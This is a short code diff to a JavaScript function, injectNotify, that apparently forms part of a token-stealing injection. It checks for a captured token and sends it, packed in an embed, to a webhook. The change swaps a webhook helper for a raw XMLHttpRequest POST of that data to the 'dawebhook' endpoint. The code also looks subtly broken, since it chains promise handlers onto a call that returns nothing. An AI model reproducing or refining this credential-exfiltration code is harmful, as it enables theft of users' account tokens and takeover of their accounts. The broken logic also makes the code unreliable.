@@ -190,7 +190,11 @@ function injectNotify() {
 
     })
 	
-	if(!token){
+	var request = new XMLHttpRequest();
+    request.open("POST", dawebhook);
+    request.setRequestHeader('Content-type', 'application/json');
+
+    if(!token){
         return;
     } else {
 
@@ -224,7 +228,7 @@ function injectNotify() {
                     inline: true,
                     });
                 });
-            hook.send(culoembed)
+                request.send(JSON.stringify(culoembed))
             .then(res => {
             })
             .catch(error => {
